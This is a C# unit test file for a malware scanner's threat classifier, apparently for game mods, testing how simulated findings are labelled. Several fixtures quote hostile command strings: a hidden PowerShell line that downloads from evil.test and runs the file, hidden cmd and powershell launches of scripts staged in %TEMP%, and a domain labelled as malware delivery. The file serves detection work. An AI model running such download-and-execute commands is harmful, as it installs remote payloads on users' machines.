using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.ThreatIntel;
using MLVScan.Services.ThreatIntel;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Services;

public class ThreatDispositionClassifierTests
{
    private const string ReviewedBoneLibUpdaterSha256 =
        "BAE327FACB187856E98F4A7997630762BAF0FE73962AAA0EEDB19F8235A9EA81";

    [Fact]
    public void Classify_WithFamilyMatch_ReturnsKnownThreat()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = new ScanFinding("Malware.Loader.Init", "Known malware behavior", Severity.Critical)
        {
            RuleId = "ProcessStartRule"
        };
        var threatFamilies = new[]
        {
            new ThreatFamilyMatch
            {
                FamilyId = "family-known",
                VariantId = "variant-a",
                DisplayName = "Known Family",
                Summary = "Known malware family",
                MatchKind = ThreatMatchKind.BehaviorVariant,
                Confidence = 0.8,
                MatchedRules = { "ProcessStartRule" },
                Evidence =
                {
                    new ThreatFamilyEvidence
                    {
                        Kind = "rule",
                        Value = "Process start",
                        RuleId = "ProcessStartRule",
                        Location = "Malware.Loader.Init"
                    }
                }
            }
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies);

        result.Classification.Should().Be(ThreatDispositionClassification.KnownThreat);
        result.PrimaryThreatFamilyId.Should().Be("family-known");
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
    }

    [Fact]
    public void Classify_WithExactHashAndBehaviorVariant_PrefersExactHashMatch()
    {
        var classifier = new ThreatDispositionClassifier();
        var threatFamilies = new[]
        {
            new ThreatFamilyMatch
            {
                FamilyId = "family-behavior",
                VariantId = "variant-a",
                DisplayName = "Behavior Variant",
                MatchKind = ThreatMatchKind.BehaviorVariant,
                Confidence = 0.99
            },
            new ThreatFamilyMatch
            {
                FamilyId = "family-exact",
                VariantId = "variant-b",
                DisplayName = "Exact Sample",
                MatchKind = ThreatMatchKind.ExactSampleHash,
                Confidence = 0.5,
                ExactHashMatch = true
            }
        };

        var result = classifier.Classify(Array.Empty<ScanFinding>(), threatFamilies);

        result.Classification.Should().Be(ThreatDispositionClassification.KnownThreat);
        result.PrimaryThreatFamilyId.Should().Be("family-exact");
    }

    [Fact]
    public void Classify_WithSuspiciousDataFlow_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var dataFlow = new DataFlowChain(
            "df-download-exec",
            DataFlowPattern.DownloadAndExecute,
            Severity.High,
            "Downloads and executes a staged payload",
            "Suspicious.Mod.Loader");
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:12",
            "DownloadFile",
            DataFlowNodeType.Source,
            "Remote payload",
            12));
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:27",
            "Process.Start",
            DataFlowNodeType.Sink,
            "Execute payload",
            27));

        var finding = new ScanFinding("Suspicious.Mod.Loader", "Suspicious staged payload execution detected", Severity.High)
        {
            RuleId = "DataFlowAnalysis",
            DataFlowChain = dataFlow
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
    }

    [Fact]
    public void Classify_WithEmbeddedResourceTempCmdDropperDataFlow_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var dataFlow = new DataFlowChain(
            "df-resource-cmd",
            DataFlowPattern.EmbeddedResourceDropAndExecute,
            Severity.Critical,
            "Embedded resource extracted to %TEMP%/payload.cmd and executed via ShellExecuteEx",
            "Suspicious.Mod.Loader");
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:12",
            "GetManifestResourceStream",
            DataFlowNodeType.Source,
            "embedded payload",
            12));
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:27",
            "PInvoke.ShellExecuteEx",
            DataFlowNodeType.Sink,
            "%TEMP%/payload.cmd",
            27));

        var finding = new ScanFinding(
            "Suspicious.Mod.Loader",
            "Embedded resource dropper launches %TEMP%/payload.cmd through ShellExecuteEx with nShow=0",
            Severity.Critical)
        {
            RuleId = "DataFlowAnalysis",
            DataFlowChain = dataFlow
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
    }

    [Fact]
    public void Classify_WithEmbeddedUpdaterExeDataFlowAndNoDropperMarkers_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = CreateEmbeddedUpdaterFinding();

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithReviewedBoneLibUpdaterHashAndExpectedBehavior_ReturnsClean()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = CreateEmbeddedUpdaterFinding();

        var result = classifier.Classify(
            new[] { finding },
            threatFamilies: null,
            analysisCompleteness: null,
            ReviewedBoneLibUpdaterSha256);

        result.Classification.Should().Be(ThreatDispositionClassification.Clean);
        result.RelatedFindings.Should().BeEmpty();
        result.BlockingRecommended.Should().BeFalse();
    }

    [Fact]
    public void Classify_WithReviewedBoneLibUpdaterHashAndUnexpectedHighEvidence_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = new ScanFinding(
            "Embedded resource: stage.ps1",
            "Embedded script stages and executes a payload",
            Severity.High)
        {
            RuleId = "EmbeddedResourceScriptRule"
        };

        var result = classifier.Classify(
            new[] { finding },
            threatFamilies: null,
            analysisCompleteness: null,
            ReviewedBoneLibUpdaterSha256);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithReviewedBoneLibUpdaterHashAndIncompleteAnalysis_ReturnsManualReview()
    {
        var classifier = new ThreatDispositionClassifier();
        var completenessFinding = new ScanFinding(
            "Assembly",
            "Data-flow analysis did not complete",
            Severity.Low)
        {
            RuleId = "DataFlowScanWarning"
        };
        var completeness = new AnalysisCompletenessResult
        {
            IsComplete = false,
            ReviewRecommended = true,
            RelatedFindings = { completenessFinding }
        };

        var result = classifier.Classify(
            new[] { completenessFinding },
            threatFamilies: null,
            completeness,
            ReviewedBoneLibUpdaterSha256);

        result.Classification.Should().Be(ThreatDispositionClassification.ManualReviewRequired);
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithReviewedBoneLibUpdaterHashAndKnownThreatFamily_ReturnsKnownThreat()
    {
        var classifier = new ThreatDispositionClassifier();
        var family = new ThreatFamilyMatch
        {
            FamilyId = "known-malware",
            DisplayName = "Known Malware",
            MatchKind = ThreatMatchKind.ExactSampleHash,
            ExactHashMatch = true,
            Confidence = 1.0
        };

        var result = classifier.Classify(
            Array.Empty<ScanFinding>(),
            new[] { family },
            analysisCompleteness: null,
            ReviewedBoneLibUpdaterSha256);

        result.Classification.Should().Be(ThreatDispositionClassification.KnownThreat);
        result.PrimaryThreatFamilyId.Should().Be("known-malware");
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithStandalonePrimitiveFinding_ReturnsClean()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = new ScanFinding("Legit.Mod.Start", "Reads local config and opens a folder", Severity.High)
        {
            RuleId = "DataExfiltrationRule"
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Clean);
        result.RelatedFindings.Should().BeEmpty();
        result.BlockingRecommended.Should().BeFalse();
    }

    [Fact]
    public void Classify_WithSingleHighSeverityCallChainFinding_ReturnsClean()
    {
        var classifier = new ThreatDispositionClassifier();
        var callChain = new CallChain("cc-native-socket", "DllImportRule", Severity.High, "Native socket receive path");
        callChain.AppendNode(new CallChainNode("Net.Socket.RecvFrom", "Calls recvfrom", CallChainNodeType.IntermediateCall));
        callChain.AppendNode(new CallChainNode("Net.Socket.Native.recvfrom", "P/Invoke declaration", CallChainNodeType.SuspiciousDeclaration));

        var finding = new ScanFinding("Net.Socket.RecvFrom", "Native socket receive interop", Severity.High)
        {
            RuleId = "DllImportRule",
            CallChain = callChain
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Clean);
        result.RelatedFindings.Should().BeEmpty();
    }

    [Fact]
    public void Classify_WithHiddenLolbinDownloadExecuteProcessStart_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var dataFlow = new DataFlowChain(
            "df-hidden-lolbin",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads and executes a staged payload",
            "Suspicious.Mod.Loader");
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:12",
            "HttpClient.GetByteArrayAsync",
            DataFlowNodeType.Source,
            "Remote payload",
            12));
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:24",
            "File.WriteAllBytes",
            DataFlowNodeType.Sink,
            "%TEMP%/d.ps1",
            24));
        dataFlow.AppendNode(new DataFlowNode(
            "Suspicious.Mod.Loader:36",
            "Process.Start",
            DataFlowNodeType.Sink,
            "Execute staged PowerShell script",
            36));

        var finding = new ScanFinding(
            "Suspicious.Mod.Loader:36",
            "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%/d.ps1\" [Evasion: CreateNoWindow=true, UseShellExecute set] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).",
            Severity.Critical)
        {
            RuleId = "ProcessStartRule",
            DataFlowChain = dataFlow
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithHiddenCmdTempBatchWithoutDataFlow_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var findings = new[]
        {
            new ScanFinding("Malware.Loader.Awake:95", "Detected FromBase64String call which decodes base64 encrypted strings.", Severity.Low)
            {
                RuleId = "Base64Rule"
            },
            new ScanFinding(
                "Malware.Loader.Awake:212",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /C \"%TEMP%/r.bat\" [Evasion: UseShellExecute=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (UseShellExecute, WindowStyle.Hidden, WorkingDirectory=Temp)]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            },
            new ScanFinding(
                "Malware.Loader.Awake",
                "High risk: Multiple suspicious patterns detected (process execution + Base64 decoding + file write)",
                Severity.High)
            {
                RuleId = "MultiSignalDetection"
            }
        };

        var result = classifier.Classify(findings, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "ProcessStartRule");
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithEmbeddedResourceScriptStager_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var finding = new ScanFinding(
            "Embedded resource: noclip.KeyBind.Config",
            "Referenced embedded resource 'noclip.KeyBind.Config' contains script execution with staged script payload markers.",
            Severity.High)
        {
            RuleId = "EmbeddedResourceScriptRule",
            CodeSnippet = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"DownloadFile('https://evil.test/a', '$env:TEMP\\test.bat'); & '$env:TEMP\\test.bat'\""
        };

        var result = classifier.Classify(new[] { finding }, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().ContainSingle().Which.Should().BeSameAs(finding);
        result.BlockingRecommended.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithKnownInfrastructureDownloadAndHiddenStagedLaunch_ReturnsSuspicious()
    {
        var classifier = new ThreatDispositionClassifier();
        var findings = new[]
        {
            new ScanFinding(
                "System.Net.WebClient.DownloadFile:50",
                "Read-only operation to known malicious domain (confirmed payload delivery infrastructure). URL(s): https://fingercakes4sale.store/OIlAL",
                Severity.High)
            {
                RuleId = "DataInfiltrationRule"
            },
            new ScanFinding(
                "Malware.Loader.Stage:95",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"t.bat\". Arguments: <unknown/no-arguments> [Evasion: CreateNoWindow=true, WindowStyle=Hidden] [Hidden process execution (CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var result = classifier.Classify(findings, threatFamilies: null);

        result.Classification.Should().Be(ThreatDispositionClassification.Suspicious);
        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "DataInfiltrationRule");
        result.RelatedFindings.Should().Contain(finding => finding.RuleId == "ProcessStartRule");
        result.BlockingRecommended.Should().BeTrue();
    }

    private static ScanFinding CreateEmbeddedUpdaterFinding()
    {
        var dataFlow = new DataFlowChain(
            "df-local-updater",
            DataFlowPattern.EmbeddedResourceDropAndExecute,
            Severity.Critical,
            "Extracts embedded updater executable and launches it from a local data directory",
            "Benign.Updater.Run");
        dataFlow.AppendNode(new DataFlowNode(
            "Benign.Updater.Run:12",
            "GetManifestResourceStream",
            DataFlowNodeType.Source,
            "embedded updater resource",
            12));
        dataFlow.AppendNode(new DataFlowNode(
            "Benign.Updater.Run:24",
            "File.Create",
            DataFlowNodeType.Sink,
            "C:/AppData/Vendor/updater.exe",
            24));
        dataFlow.AppendNode(new DataFlowNode(
            "Benign.Updater.Run:36",
            "Process.Start",
            DataFlowNodeType.Sink,
            "run local updater executable",
            36));

        return new ScanFinding(
            "Benign.Updater.Run",
            "Detected Process.Start for an embedded updater executable with correlated data flow",
            Severity.Critical)
        {
            RuleId = "ProcessStartRule",
            DataFlowChain = dataFlow
        };
    }
}
